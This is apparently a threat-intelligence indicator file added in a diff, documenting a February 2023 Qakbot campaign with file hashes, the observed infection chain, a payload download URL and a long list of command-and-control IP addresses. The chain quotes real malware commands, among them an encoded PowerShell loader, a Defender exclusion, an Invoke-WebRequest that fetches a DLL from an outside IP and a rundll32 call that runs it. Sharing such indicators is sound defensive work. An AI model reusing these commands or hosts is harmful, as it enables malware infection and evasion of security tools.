@@ -1,0 +1,172 @@
+22.02.2023 | Qakbot | BB17 | Campaign 1677046917 | Version 404.9
+
+*************************************************
+
+.html 49f51250934f27cf485ca857315e25165a657000121119951c559d3b13b85ec2 - itemME.html
+.zip 24a7bf6e9ddf1d012bf184564955a075780a758e7cfb7849902b5200481a7403 - pw = 764
+.img b087012cc7a352a538312351d3c22bb1098c5b64107c8dca18645320e58fd92f
+.dll 227aa72b932ddd6ab0bc7788bb024d47e2ab37bff073b3cf462191b3bd97576c
+
+*************************************************
+
+Exec > #1 
+
+ONENOTE.EXE C:\Users\Admin\AppData\Local\Temp\Item.one
+
+E:\Mnemic\zelatrixDevoutlessness\thermochroic.exe /C caseateIntraprocess || ping radical || Bloodlettings\Reversable\Kithing\Overmild.cmd untillTecture Concerningness
+
+ping  radical 
+
+cmd.exe  /S /D /c" echo f"
+
+xcopy C:\Windows\\\\\\system32\\\\\\wscript.exe C:\Users\Admin\AppData\Local\Temp\HistoplasminKimura.exe /h /s /e
+
+C:\Windows\system32\cmd.exe  /S /D /c" echo f"
+
+xcopy C:\Windows\system32\reg.exe C:\Users\Admin\AppData\Local\Temp\PsychogalvanometerUnaching.exe /h /s /e
+
+PsychogalvanometerUnaching.exe import Cohesiveness\Aleknight.ad
+
+HistoplasminKimura.exe Mnemic\zelatrixDevoutlessness\neurinGrosgrain.wsf
+
+powershell.exe $strongbark = Get-ItemProperty -Path HKCU:\SOFTWARE\strongbark | %{$_.ReutilisingOstracodan}; powershell -windowstyle Minimized -encodedcommand $strongbark
+
+powershell.exe -windowstyle Minimized -encodedcommand $ugubineApertured = Get-ItemProperty -Path HKCU:\\SOFTWARE\\Stereomicroscopy | %{$_.Nonconfidently}; $EugubineApertured = "pentremitalStalks" + $EugubineApertured; [Reflection.Assembly]::Load([Convert]::fromBase64String($EugubineApertured)); [classicyc1]::Execute("powershell -executionpolicy bypass -windowstyle hidden ""`$currentDrive = `(get-location`).Drive.Name + ':\'; Add-MpPreference -ExclusionPath `$currentDrive;Start-Sleep -Seconds 10;reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Userinit /f; reg delete HKEY_CURRENT_USER\SOFTWARE\Stereomicroscopy /v Nonconfidently /f""");Start-Sleep -Seconds 10;Invoke-WebRequest http://67.207.84.43/Gy0toZ0/2 -O $env:TEMP\Fishlines.dll; rundll32 $env:TEMP\\Fishlines.dll,N115;
+
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\Altheine.dll,N115
+
+cmd.exe /c start https://learn.microsoft.com/microsoft-365/troubleshoot/
+
+*************************************************
+
+distro urls
+
+http://67.207.84.43/Gy0toZ0/2/\Fishlines.dll
+
+
+*************************************************
+
+
+*************************************************
+
+c2's
+
+12.172.173.82:20
+66.191.69.18:995
+186.64.87.213:443
+108.190.203.42:995
+50.68.204.71:443
+136.232.184.134:995
+103.42.86.110:995
+174.118.36.28:443
+75.143.236.149:443
+72.203.216.98:2222
+85.241.180.94:443
+197.92.136.122:443
+72.200.109.104:443
+85.152.152.46:443
+102.156.252.46:443
+12.172.173.82:995
+2.99.47.198:2222
+172.248.42.122:443
+70.77.116.233:443
+162.248.14.107:443
+105.156.112.30:443
+103.140.174.19:2222
+174.104.184.149:443
+80.13.205.69:2222
+12.172.173.82:990
+47.34.30.133:443
+84.35.26.14:995
+73.161.176.218:443
+188.49.116.2:995
+12.172.173.82:21
+24.239.69.244:443
+45.50.233.214:443
+12.172.173.82:465
+73.22.121.210:443
+73.165.119.20:443
+86.178.18.239:443
+100.10.72.114:443
+87.221.197.113:2222
+173.18.126.3:443
+14.192.241.76:995
+24.187.145.201:2222
+90.104.22.28:2222
+91.254.132.23:443
+74.92.243.113:50000
+92.154.45.81:2222
+86.190.223.11:2222
+136.244.25.165:443
+116.75.188.138:443
+92.239.81.124:443
+86.191.237.255:50000
+103.231.216.238:443
+201.244.108.183:995
+103.111.70.115:995
+47.21.51.138:995
+161.142.102.110:995
+71.31.101.183:443
+98.145.23.67:443
+86.225.214.138:2222
+86.97.52.177:2222
+70.160.80.210:443
+12.172.173.82:2087
+90.211.192.113:443
+76.170.252.153:995
+72.80.7.6:995
+116.72.250.18:443
+35.143.97.145:995
+47.21.51.138:443
+72.80.7.6:50003
+82.127.204.82:2222
+103.141.50.102:995
+109.149.147.104:2222
+87.223.83.119:443
+92.27.86.48:2222
+92.154.17.149:2222
+103.252.7.231:443
+103.212.19.254:995
+114.143.176.235:443
+180.151.104.240:443
+85.59.61.52:2222
+122.184.143.82:443
+2.50.47.74:443
+174.58.146.57:443
+86.207.227.152:2222
+125.99.69.178:443
+46.27.231.50:2078
+27.109.19.90:2078
+59.28.84.65:443
+87.243.146.59:443
+12.172.173.82:50001
+75.156.125.215:995
+103.111.70.115:443
+89.129.109.27:2222
+190.191.35.122:443
+86.130.9.136:2222
+79.67.165.149:995
+151.65.177.218:443
+108.2.111.66:995
+69.133.162.35:443
+12.172.173.82:32101
+81.229.117.95:2222
+212.69.141.168:995
+75.98.154.19:443
+50.68.204.71:993
+124.122.56.144:443
+80.47.61.240:2222
+50.68.204.71:995
+198.2.51.242:993
+103.144.201.53:2078
+202.142.98.62:995
+147.219.4.194:443
+77.124.6.149:443
+49.245.82.178:2222
+86.202.48.142:2222
+76.80.180.154:995
+73.36.196.11:443
+39.40.207.24:995
+105.186.191.199:995
+58.186.75.42:443
+
